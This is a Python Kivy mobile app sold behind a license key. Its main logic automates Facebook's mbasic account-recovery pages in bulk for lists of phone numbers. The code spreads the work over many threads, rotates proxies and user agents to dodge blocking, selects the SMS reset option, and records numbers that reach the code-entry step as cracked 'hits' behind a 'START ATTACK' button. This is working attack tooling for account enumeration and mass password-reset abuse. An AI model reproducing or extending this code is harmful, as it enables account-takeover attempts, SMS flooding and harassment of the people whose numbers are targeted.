import threading
import queue
import requests
import random
import re
import os
import time
import sys
import webbrowser
from datetime import datetime
from urllib.parse import unquote

# --- KIVY & KIVYMD IMPORTS ---
from kivy.lang import Builder
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.utils import platform
from kivy.core.clipboard import Clipboard
from kivymd.app import MDApp
from kivymd.uix.screen import MDScreen
from kivymd.uix.list import TwoLineAvatarIconListItem, IconLeftWidget
from kivymd.uix.snackbar import Snackbar
from kivymd.uix.dialog import MDDialog
from kivymd.uix.button import MDFlatButton, MDRaisedButton, MDFillRoundFlatButton
from kivymd.uix.filemanager import MDFileManager
from kivymd.uix.chip import MDChip
from kivymd.toast import toast
from bs4 import BeautifulSoup
from kivy.properties import StringProperty, NumericProperty, BooleanProperty, ListProperty

# --- CONFIGURATION ---
class BotConfig:
    TOOL_NAME = "ADVANCE MOBILE TOOLS"
    VERSION = "3.5.0 ULTIMATE"
    ADMIN_USERNAME = "toolsadmin_A"
    ADMIN_URL = "https://t.me/toolsadmin_A"
    CHANNEL_URL = "https://t.me/AdvanceMobileTools"
    KEY_URL = "https://script.google.com/macros/s/AKfycbz0qQGXtFxyfanZb33MAuSYN3Mch_3bGuYRZ2Nxw1kHA0qxqq5urusH3sf2k1EHgORR/exec"

# --- DEVICE ID LOGIC ---
def get_device_id():
    try:
        if platform == 'android':
            from jnius import autoclass
            Secure = autoclass('android.provider.Settings$Secure')
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            context = PythonActivity.mActivity.getContentResolver()
            return Secure.getString(context, Secure.ANDROID_ID)
        else:
            import uuid
            return str(uuid.getnode())
    except:
        return "UNKNOWN_DEVICE"

# --- KEY VALIDATION LOGIC ---
def validate_key_sync(key, hwid):
    try:
        url = f"{BotConfig.KEY_URL}?action=check&key={key}&hwid={hwid}"
        response = requests.get(url, timeout=15)
        return response.text.strip()
    except:
        return "CONNECTION_ERROR"

# --- UI LAYOUT (KV LANGUAGE) ---
KV = '''
#:import HexColor kivy.utils.get_color_from_hex
#:import BotConfig __main__.BotConfig

<StatCard@MDCard>:
    title: ""
    count: "0"
    icon: "android"
    color_bg: "#1E1E1E"
    orientation: "vertical"
    padding: dp(10)
    size_hint: 0.45, None
    height: dp(90)
    elevation: 3
    radius: [12]
    ripple_behavior: True
    md_bg_color: HexColor(root.color_bg)
    
    MDBoxLayout:
        orientation: "horizontal"
        size_hint_y: None
        height: dp(30)
        MDIcon:
            icon: root.icon
            theme_text_color: "Custom"
            text_color: 1, 1, 1, 0.8
            pos_hint: {"center_y": .5}
        MDLabel:
            text: root.title
            halign: "right"
            font_style: "Caption"
            theme_text_color: "Custom"
            text_color: 1, 1, 1, 0.6
            pos_hint: {"center_y": .5}

    MDLabel:
        text: root.count
        halign: "center"
        font_style: "H4"
        bold: True
        theme_text_color: "Custom"
        text_color: 1, 1, 1, 1
        pos_hint: {"center_y": .5}

ScreenManager:
    KeyScreen:
    MainScreen:

<KeyScreen>:
    name: "key_screen"
    MDBoxLayout:
        orientation: "vertical"
        padding: dp(30)
        spacing: dp(25)
        md_bg_color: HexColor("#0f0f13")

        MDIcon:
            icon: "shield-lock-outline"
            halign: "center"
            theme_text_color: "Custom"
            text_color: HexColor("#00E676")
            font_size: dp(80)
            pos_hint: {"center_x": .5}

        MDLabel:
            text: "SECURITY CHECK"
            halign: "center"
            font_style: "H5"
            bold: True
            theme_text_color: "Custom"
            text_color: HexColor("#FFFFFF")

        MDLabel:
            text: f"DEVICE ID: {app.device_id}"
            halign: "center"
            font_style: "Caption"
            theme_text_color: "Custom"
            text_color: HexColor("#808080")
            size_hint_y: None
            height: dp(20)

        MDTextField:
            id: key_input
            hint_text: "License Key"
            mode: "fill"
            fill_color_normal: HexColor("#1E1E1E")
            icon_right: "key-variant"
            icon_right_color: HexColor("#00E676")
            line_color_focus: HexColor("#00E676")
            text_color_focus: HexColor("#FFFFFF")
            hint_text_color_focus: HexColor("#00E676")

        MDFillRoundFlatButton:
            text: "AUTHENTICATE"
            font_size: "18sp"
            pos_hint: {"center_x": .5}
            size_hint_x: 0.8
            md_bg_color: HexColor("#00E676")
            text_color: 0, 0, 0, 1
            on_release: app.check_key(key_input.text)

        MDFlatButton:
            text: "GET PREMIUM KEY"
            pos_hint: {"center_x": .5}
            theme_text_color: "Custom"
            text_color: HexColor("#29B6F6")
            on_release: app.contact_admin()

<MainScreen>:
    name: "main_screen"
    MDBoxLayout:
        orientation: 'vertical'
        md_bg_color: HexColor("#121212")

        MDTopAppBar:
            title: "CYBER TOOLS V3.5"
            anchor_title: "center"
            right_action_items: [["power", lambda x: app.stop_process(), "Stop Engine"]]
            md_bg_color: HexColor("#1F1F1F")
            specific_text_color: HexColor("#00E676")
            elevation: 0

        MDBottomNavigation:
            id: bottom_nav
            selected_color_background: HexColor("#1F1F1F")
            text_color_active: HexColor("#00E676")
            text_color_normal: HexColor("#666666")
            use_text: True

            MDBottomNavigationItem:
                name: 'screen_home'
                text: 'Dashboard'
                icon: 'view-dashboard-outline'
                MDBoxLayout:
                    orientation: 'vertical'
                    padding: dp(15)
                    spacing: dp(15)
                    md_bg_color: HexColor("#121212")

                    # Stats Grid
                    MDGridLayout:
                        cols: 2
                        spacing: dp(12)
                        size_hint_y: None
                        height: dp(200)
                        StatCard:
                            title: "TOTAL"
                            icon: "format-list-numbered"
                            count: app.stat_total
                            color_bg: "#212121"
                        StatCard:
                            title: "HITS"
                            icon: "check-circle-outline"
                            count: app.stat_success
                            color_bg: "#1B5E20"
                        StatCard:
                            title: "BAD"
                            icon: "close-circle-outline"
                            count: app.stat_fail
                            color_bg: "#B71C1C"
                        StatCard:
                            title: "CAPTCHA"
                            icon: "robot"
                            count: app.stat_captcha
                            color_bg: "#BF360C"

                    # Status Bar
                    MDCard:
                        size_hint_y: None
                        height: dp(50)
                        padding: dp(10)
                        radius: [8]
                        md_bg_color: HexColor("#212121")
                        
                        MDSpinner:
                            id: spinner
                            size_hint: None, None
                            size: dp(24), dp(24)
                            active: False
                            palette: [HexColor("#00E676")]
                            pos_hint: {'center_y': .5}
                        
                        MDLabel:
                            text: f"  Time: {app.elapsed_time}"
                            theme_text_color: "Custom"
                            text_color: HexColor("#FFFFFF")
                            pos_hint: {'center_y': .5}
                            bold: True

                    MDTextField:
                        id: input_box
                        hint_text: "Load Numbers List"
                        mode: "rectangle"
                        multiline: True
                        size_hint_y: 1
                        line_color_normal: HexColor("#424242")
                        line_color_focus: HexColor("#00E676")
                    
                    MDBoxLayout:
                        spacing: dp(10)
                        size_hint_y: None
                        height: dp(50)
                        MDFillRoundFlatButton:
                            text: "LOAD FILE"
                            icon: "folder-open"
                            size_hint_x: 0.4
                            md_bg_color: HexColor("#424242")
                            on_release: app.file_manager_open("numbers")
                        MDFillRoundFlatButton:
                            id: start_btn
                            text: "START ATTACK"
                            font_size: "16sp"
                            size_hint_x: 0.6
                            md_bg_color: HexColor("#00E676")
                            text_color: 0, 0, 0, 1
                            on_release: app.start_process()

            MDBottomNavigationItem:
                name: 'screen_console'
                text: 'Console'
                icon: 'console'
                MDBoxLayout:
                    orientation: 'vertical'
                    padding: dp(10)
                    md_bg_color: HexColor("#000000")
                    
                    MDLabel:
                        text: "SYSTEM LOGS >_"
                        size_hint_y: None
                        height: dp(30)
                        theme_text_color: "Custom"
                        text_color: HexColor("#00E676")
                        bold: True
                    
                    ScrollView:
                        do_scroll_x: False
                        MDLabel:
                            id: console_log
                            text: "Waiting for commands..."
                            font_name: "RobotoMono-Regular" if app.has_mono_font else "Roboto"
                            font_size: "12sp"
                            size_hint_y: None
                            height: self.texture_size[1]
                            theme_text_color: "Custom"
                            text_color: HexColor("#00FF00")
                            valign: "bottom"

            MDBottomNavigationItem:
                name: 'screen_success'
                text: 'Results'
                icon: 'trophy-variant-outline'
                MDBoxLayout:
                    orientation: 'vertical'
                    md_bg_color: HexColor("#121212")
                    MDTopAppBar:
                        title: "SUCCESS HITS"
                        md_bg_color: HexColor("#1F1F1F")
                        right_action_items: [["content-save", lambda x: app.save_hits()], ["content-copy", lambda x: app.copy_hits()], ["delete", lambda x: app.clear_results()]]
                        elevation: 0
                    ScrollView:
                        MDList:
                            id: list_success

            MDBottomNavigationItem:
                name: 'screen_settings'
                text: 'Config'
                icon: 'cog-outline'
                MDBoxLayout:
                    orientation: 'vertical'
                    padding: dp(20)
                    spacing: dp(20)
                    md_bg_color: HexColor("#121212")

                    MDLabel:
                        text: "CONFIGURATION"
                        font_style: "H6"
                        theme_text_color: "Custom"
                        text_color: HexColor("#00E676")

                    # Threads
                    MDCard:
                        orientation: "vertical"
                        padding: dp(15)
                        size_hint_y: None
                        height: dp(90)
                        radius: [10]
                        md_bg_color: HexColor("#1E1E1E")
                        MDLabel:
                            text: f"Threads: {int(thread_slider.value)}"
                            theme_text_color: "Secondary"
                        MDSlider:
                            id: thread_slider
                            min: 1
                            max: 50
                            value: 20
                            color: HexColor("#00E676")

                    # Proxy Config
                    MDCard:
                        orientation: "vertical"
                        padding: dp(15)
                        size_hint_y: None
                        height: dp(150)
                        radius: [10]
                        md_bg_color: HexColor("#1E1E1E")
                        spacing: dp(10)
                        
                        MDBoxLayout:
                            size_hint_y: None
                            height: dp(30)
                            MDLabel:
                                text: "Proxy Settings"
                                theme_text_color: "Secondary"
                            MDSwitch:
                                id: proxy_switch
                                active: False
                                thumb_color_down: HexColor("#00E676")
                        
                        MDBoxLayout:
                            spacing: dp(5)
                            adaptive_height: True
                            MDRaisedButton:
                                text: "HTTP"
                                md_bg_color: HexColor("#00E676") if app.proxy_type == "http" else HexColor("#424242")
                                text_color: [0,0,0,1] if app.proxy_type == "http" else [1,1,1,1]
                                on_release: app.set_proxy_type("http")
                            MDRaisedButton:
                                text: "SOCKS4"
                                md_bg_color: HexColor("#00E676") if app.proxy_type == "socks4" else HexColor("#424242")
                                text_color: [0,0,0,1] if app.proxy_type == "socks4" else [1,1,1,1]
                                on_release: app.set_proxy_type("socks4")
                            MDRaisedButton:
                                text: "SOCKS5"
                                md_bg_color: HexColor("#00E676") if app.proxy_type == "socks5" else HexColor("#424242")
                                text_color: [0,0,0,1] if app.proxy_type == "socks5" else [1,1,1,1]
                                on_release: app.set_proxy_type("socks5")

                        MDRaisedButton:
                            text: "LOAD PROXY LIST"
                            size_hint_x: 1
                            md_bg_color: HexColor("#333333")
                            on_release: app.file_manager_open("proxy")
                        
                        MDLabel:
                            id: proxy_status
                            text: "No Proxies Loaded"
                            halign: "center"
                            font_style: "Caption"
                            theme_text_color: "Hint"

                    MDCard:
                        orientation: "vertical"
                        padding: dp(15)
                        size_hint_y: None
                        height: dp(120)
                        radius: [10]
                        md_bg_color: HexColor("#1E1E1E")
                        
                        MDLabel:
                            text: "Support"
                            theme_text_color: "Secondary"
                        
                        MDLabel:
                            text: f"Dev: {BotConfig.ADMIN_USERNAME}\\nVer: {BotConfig.VERSION}"
                            font_style: "Caption"
                            theme_text_color: "Hint"
                        
                        MDRaisedButton:
                            text: "TELEGRAM CHANNEL"
                            size_hint_x: 1
                            md_bg_color: HexColor("#29B6F6")
                            on_release: app.contact_admin()
'''

# --- SCREEN CLASSES ---
class KeyScreen(MDScreen): pass
class MainScreen(MDScreen): pass

# --- GLOBAL VARIABLES ---
is_running = False
stats = {"success": 0, "fail": 0, "captcha": 0, "total": 0}
proxies_list = []
success_numbers = []
start_time = None

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 2.3.4; GT-I9100 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
    "Mozilla/5.0 (Linux; U; Android 2.2; en-us; SCH-I800 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
    "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
]

# --- UTILS ---
def force_mbasic(url):
    if not url: return "https://mbasic.facebook.com/login/identify/"
    if "facebook.com" in url:
        return url.replace("www.facebook.com", "mbasic.facebook.com").replace("m.facebook.com", "mbasic.facebook.com").replace("free.facebook.com", "mbasic.facebook.com").replace("d.facebook.com", "mbasic.facebook.com")
    return url

def format_action_url(action):
    if not action: return "https://mbasic.facebook.com/login/identify/"
    if action.startswith("http"): return force_mbasic(action)
    return "https://mbasic.facebook.com" + action

# --- CORE LOGIC PORTED FROM CLI ---
def check_and_follow_redirect(session, content, headers):
    try:
        soup = BeautifulSoup(content, 'html.parser')
        redirect_url = None
        
        # 1. Meta Refresh
        meta_refresh = soup.find('meta', attrs={'http-equiv': re.compile(r'^refresh$', re.I)})
        if meta_refresh:
            content_attr = meta_refresh.get('content', '')
            match = re.search(r'url\s*=\s*([^;]+)', content_attr, re.I)
            if match: redirect_url = unquote(match.group(1).strip("'\""))

        # 2. JS Redirect
        if not redirect_url:
            for script in soup.find_all('script'):
                if script.string:
                    match = re.search(r'(?:window|document)\.location(?:\.href)?\s*=\s*["\']([^"\']+)["\']', script.string)
                    if match:
                        redirect_url = unquote(match.group(1).replace('\\/', '/'))
                        break

        # 3. Fallback: Single Link
        if not redirect_url and len(content) < 3000:
            links = soup.find_all('a')
            if len(links) > 0 and len(links) <= 3:
                 href = links[0].get('href')
                 if href: redirect_url = href

        if redirect_url:
            return session.get(force_mbasic(redirect_url), headers=headers, timeout=15)
    except: pass
    return None

def handle_cookie_consent(session, content, headers):
    try:
        soup = BeautifulSoup(content, 'html.parser')
        text_lower = soup.get_text().lower()
        if "allow" in text_lower or "accept" in text_lower or "cookie" in text_lower or "data policy" in text_lower:
            form = soup.find('form', {'method': 'post'})
            if form:
                action_url = format_action_url(form.get('action', ''))
                data = {}
                for inp in form.find_all('input'):
                    if inp.get('name'): data[inp.get('name')] = inp.get('value', '')
                session.post(action_url, headers=headers, data=data, timeout=10)
                return True
    except: pass
    return False

def check_success(soup, content_str):
    text_lower = content_str.lower()
    keywords = [
        "enter the 6-digit code", "we sent a code", "check your sms", 
        "enter security code", "sent to your", "digit code", 
        "we've sent your code", "enter the code", "your code is",
        "কোড লিখুন", "আপনার কোড" 
    ]
    if any(k in text_lower for k in keywords): return True

    if soup.find('input', {'name': 'n'}): return True

    # Bloks JSON Check
    if '"event_step","event","extra_client_data_bks_input"' in content_str:
         if '"pre_mt_behavior","search_sent_client"' in content_str: return True
    return False

def execute_cracking(number, use_proxy, proxy_type):
    try:
        session = requests.Session()
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        
        if use_proxy and proxies_list:
            prx = random.choice(proxies_list)
            if "socks" in proxy_type:
                # Basic string formatting for Kivy requests if pysocks is present, otherwise acts as standard
                session.proxies = {"http": f"{proxy_type}://{prx}", "https": f"{proxy_type}://{prx}"}
            else:
                session.proxies = {"http": f"http://{prx}", "https": f"http://{prx}"}

        url = "https://mbasic.facebook.com/login/identify/"
        req1 = None
        form = None
        
        # 1. INITIAL REQUEST LOOP
        for attempt in range(4): 
            try:
                if not req1:
                    req1 = session.get(url, headers=headers, timeout=15)
                
                redir = check_and_follow_redirect(session, req1.content, headers)
                if redir: 
                    req1 = redir
                    continue

                if handle_cookie_consent(session, req1.content, headers):
                    req1 = session.get(url, headers=headers, timeout=15)

                soup = BeautifulSoup(req1.content, 'html.parser')
                page_title = soup.title.get_text() if soup.title else ""
                text_lower = soup.get_text().lower()
                
                if "error facebook" in page_title.lower() or "something went wrong" in text_lower:
                    if attempt < 3: time.sleep(2); continue
                    else: return 'blocked'
                
                # Auto Redirect for Login Page
                if soup.find('input', {'name': 'pass'}):
                    recover_link = soup.find('a', href=re.compile(r'(recover|identify)'))
                    if recover_link:
                        href = format_action_url(recover_link['href'])
                        req1 = session.get(href, headers=headers, timeout=15)
                        continue

                # Find Form
                target_input = soup.find('input', {'name': 'email'})
                if target_input: form = target_input.find_parent('form')
                if not form:
                    for f in soup.find_all('form'):
                        if 'identify' in f.get('action', '') or 'search' in f.get('action', ''): form = f; break
                if not form:
                    for f in soup.find_all('form'):
                        if f.get('method', '').lower() == 'post' and f.find('input'): form = f; break
                if form: break 
            except: time.sleep(1)
        
        if not form: 
            if req1 and check_success(BeautifulSoup(req1.content, 'html.parser'), req1.text):
                return 'success'
            return 'error'

        action_url = format_action_url(form.get('action', ''))
        data = {inp.get('name'): inp.get('value', '') for inp in form.find_all('input') if inp.get('name')}
        data['email'] = number
        
        try:
            req_next = session.post(action_url, headers=headers, data=data, timeout=15)
        except: return 'net_error'

        # 2. NAVIGATION LOOP
        for step in range(1, 5):
            redir = check_and_follow_redirect(session, req_next.content, headers)
            if redir: req_next = redir

            content_str = req_next.text
            soup = BeautifulSoup(req_next.content, 'html.parser')
            text_lower = soup.get_text().lower()

            if check_success(soup, content_str): return 'success'

            if "did not match" in text_lower or "no search results" in text_lower: return 'not_found'
            if "captcha" in text_lower or "security check" in text_lower: return 'captcha'
            if "something went wrong" in text_lower: return 'blocked'

            try_another_way = soup.find('a', href=lambda x: x and '/recover/initiate/' in x)
            if try_another_way:
                 link = format_action_url(try_another_way['href'])
                 try:
                     req_next = session.get(link, headers=headers, timeout=15)
                     continue 
                 except: return 'net_error'

            form = soup.find('form', {'method': 'post'})
            if not form:
                continue_link = soup.find('a', string=re.compile(r'Continue|Next|অব্যাহত', re.I))
                if continue_link:
                    href = format_action_url(continue_link['href'])
                    req_next = session.get(href, headers=headers, timeout=15)
                    continue
                break

            action_url = format_action_url(form.get('action', ''))
            data = {inp.get('name'): inp.get('value', '') for inp in form.find_all('input') if inp.get('name')}

            radios = form.find_all('input', {'type': 'radio'})
            if radios:
                found_sms = False
                for radio in radios:
                    val = radio.get('value', '').lower()
                    label_text = ""
                    if radio.get('id'):
                        l = soup.find('label', {'for': radio.get('id')})
                        if l: label_text = l.get_text().lower()
                    
                    if "sms" in val or "sms" in label_text:
                        data[radio.get('name')] = radio.get('value')
                        found_sms = True; break
                
                if not found_sms: data[radios[0].get('name')] = radios[0].get('value')

            submit_btn = form.find('input', {'type': 'submit'})
            if not submit_btn: submit_btn = form.find('button', {'type': 'submit'})
            if submit_btn and submit_btn.get('name'):
                data[submit_btn.get('name')] = submit_btn.get('value', '')

            try:
                time.sleep(1) 
                req_next = session.post(action_url, headers=headers, data=data, timeout=15)
            except: return 'net_error'

        return 'fail'
    except: return 'error'

# --- THREAD WORKER ---
def worker(numbers_q, app_instance, use_proxy, proxy_type):
    while is_running and not numbers_q.empty():
        try:
            number = numbers_q.get()
            app_instance.log_to_console(f"[EXEC] Checking {number}...")
            result = execute_cracking(number, use_proxy, proxy_type)
            
            if result == 'success':
                stats['success'] += 1
                success_numbers.append(number)
                app_instance.add_result_item(number)
                app_instance.log_to_console(f"[HIT] Success: {number}")
            elif result == 'captcha': 
                stats['captcha'] += 1
                app_instance.log_to_console(f"[CAPTCHA] {number}")
            elif result == 'not_found':
                stats['fail'] += 1
                app_instance.log_to_console(f"[BAD] No Account: {number}")
            elif result == 'blocked':
                stats['fail'] += 1
                app_instance.log_to_console(f"[BLOCK] IP Blocked: {number}")
            elif result == 'net_error':
                stats['fail'] += 1
                app_instance.log_to_console(f"[ERR] Network Error: {number}")
            else: 
                stats['fail'] += 1
            
            app_instance.update_stats_ui()
        except: pass
        finally: numbers_q.task_done()
    
    if numbers_q.empty() and is_running: 
        # Schedule the stop_process call on the main thread to avoid UI thread errors
        Clock.schedule_once(lambda dt: app_instance.stop_process(finished=True))

# --- MAIN APP ---
class AdvanceToolsApp(MDApp):
    device_id = StringProperty("...")
    version_info = StringProperty(BotConfig.VERSION)
    stat_total = StringProperty("0")
    stat_success = StringProperty("0")
    stat_fail = StringProperty("0")
    stat_captcha = StringProperty("0")
    elapsed_time = StringProperty("00:00:00")
    proxy_type = StringProperty("http")
    has_mono_font = BooleanProperty(False)

    def build(self):
        self.theme_cls.theme_style = "Dark"
        self.theme_cls.primary_palette = "Green"
        self.theme_cls.accent_palette = "Teal"
        self.device_id = get_device_id()
        # Check for monospaced font availability (optional, fallback to default)
        return Builder.load_string(KV)

    def on_start(self):
        if os.path.exists("key.txt"):
            with open("key.txt", "r") as f: k = f.read().strip()
            if k: threading.Thread(target=self.auto_validate, args=(k,)).start()

    def auto_validate(self, key):
        if validate_key_sync(key, self.device_id) == "APPROVED":
            Clock.schedule_once(lambda dt: self.switch_to_main())

    def check_key(self, key):
        if not key: return toast("Enter Key")
        threading.Thread(target=self.bg_validate, args=(key,)).start()

    def bg_validate(self, key):
        if validate_key_sync(key, self.device_id) == "APPROVED":
            with open("key.txt", "w") as f: f.write(key)
            Clock.schedule_once(lambda dt: self.switch_to_main())
        else:
            Clock.schedule_once(lambda dt: toast("Invalid Key"))

    def switch_to_main(self): self.root.current = "main_screen"
    def contact_admin(self): webbrowser.open(BotConfig.ADMIN_URL)

    # --- FILE MANAGER ---
    def file_manager_open(self, mode):
        self.file_mode = mode
        path = os.path.expanduser("~")
        if platform == 'android':
            from android.storage import primary_external_storage_path
            path = primary_external_storage_path()
        self.file_manager = MDFileManager(exit_manager=self.exit_manager, select_path=self.select_path, preview=False)
        self.file_manager.show(path)

    def select_path(self, path):
        self.exit_manager()
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [l.strip() for l in f if l.strip()]
            if self.file_mode == "numbers":
                self.root.get_screen('main_screen').ids.input_box.text = "\n".join(lines)
                toast(f"Loaded {len(lines)} numbers")
            else:
                global proxies_list
                proxies_list = lines
                self.root.get_screen('main_screen').ids.proxy_status.text = f"{len(lines)} Proxies Active"
                toast("Proxies Loaded")
        except Exception as e: toast(f"Error: {e}")

    def exit_manager(self, *args): self.file_manager.close()

    # --- PROXY SETTINGS ---
    def set_proxy_type(self, type):
        self.proxy_type = type
        toast(f"Proxy Mode: {type.upper()}")

    # --- PROCESS CONTROL ---
    def update_stats_ui(self):
        Clock.schedule_once(lambda dt: self._update_ui())

    def _update_ui(self):
        self.stat_success = str(stats['success'])
        self.stat_fail = str(stats['fail'])
        self.stat_captcha = str(stats['captcha'])

    def log_to_console(self, msg):
        Clock.schedule_once(lambda dt: self._append_log(msg))

    def _append_log(self, msg):
        console = self.root.get_screen('main_screen').ids.console_log
        timestamp = datetime.now().strftime("%H:%M:%S")
        new_line = f"[{timestamp}] {msg}\n"
        # Keep last 50 lines to prevent lag
        current_text = console.text.split('\n')[-50:]
        current_text.append(new_line.strip())
        console.text = "\n".join(current_text)

    def add_result_item(self, number):
        Clock.schedule_once(lambda dt: self._add_ui_item(number))

    def _add_ui_item(self, number):
        container = self.root.get_screen('main_screen').ids.list_success
        item = TwoLineAvatarIconListItem(
            text=number,
            secondary_text=f"Cracked at {datetime.now().strftime('%H:%M')}",
            theme_text_color="Custom",
            text_color=(1,1,1,1),
            secondary_theme_text_color="Custom",
            secondary_text_color=(0,1,0,1)
        )
        item.add_widget(IconLeftWidget(icon="lock-open-check", theme_text_color="Custom", text_color=(0,1,0,1)))
        container.add_widget(item)

    def update_timer(self, dt):
        if is_running and start_time:
            delta = datetime.now() - start_time
            # Format timedelta removing microseconds
            self.elapsed_time = str(delta).split('.')[0]

    def start_process(self):
        global is_running, stats, start_time
        text = self.root.get_screen('main_screen').ids.input_box.text
        nums = [n.strip() for n in text.split('\n') if n.strip()]
        
        if not nums: return toast("Load numbers first!")
        
        is_running = True
        start_time = datetime.now()
        stats = {"success": 0, "fail": 0, "captcha": 0, "total": len(nums)}
        self.stat_total = str(len(nums))
        
        ids = self.root.get_screen('main_screen').ids
        ids.start_btn.disabled = True
        ids.spinner.active = True
        
        # Start Timer
        Clock.schedule_interval(self.update_timer, 1)
        
        q = queue.Queue()
        for n in nums: q.put(n)
        
        threads = int(ids.thread_slider.value)
        use_proxy = ids.proxy_switch.active
        
        for _ in range(threads):
            t = threading.Thread(target=worker, args=(q, self, use_proxy, self.proxy_type))
            t.daemon = True; t.start()
            
        toast(f"Attack Started with {threads} Threads")
        self.root.get_screen('main_screen').ids.bottom_nav.switch_tab('screen_console')

    def stop_process(self, finished=False):
        global is_running
        # Check if already stopped to prevent race conditions or duplicate UI updates
        if not is_running and not finished:
            return

        is_running = False
        Clock.unschedule(self.update_timer)
        
        ids = self.root.get_screen('main_screen').ids
        ids.start_btn.disabled = False
        ids.spinner.active = False
        
        msg = "Process Completed" if finished else "Process Stopped"
        self.log_to_console(f"*** {msg} ***")
        toast(msg)

    # --- RESULT MANAGEMENT ---
    def copy_hits(self):
        if not success_numbers: return toast("No hits to copy")
        Clipboard.copy("\n".join(success_numbers))
        toast("Copied to Clipboard")

    def save_hits(self):
        if not success_numbers: return toast("No hits to save")
        try:
            fname = f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            # Save to internal storage or appropriate path
            if platform == 'android':
                from android.storage import primary_external_storage_path
                path = os.path.join(primary_external_storage_path(), "Download", fname)
            else:
                path = fname
                
            with open(path, "w") as f:
                f.write("\n".join(success_numbers))
            toast(f"Saved to {path}")
        except Exception as e: toast(f"Save Failed: {e}")

    def clear_results(self):
        global success_numbers
        success_numbers = []
        self.root.get_screen('main_screen').ids.list_success.clear_widgets()
        toast("Results Cleared")

if __name__ == '__main__':
    AdvanceToolsApp().run()
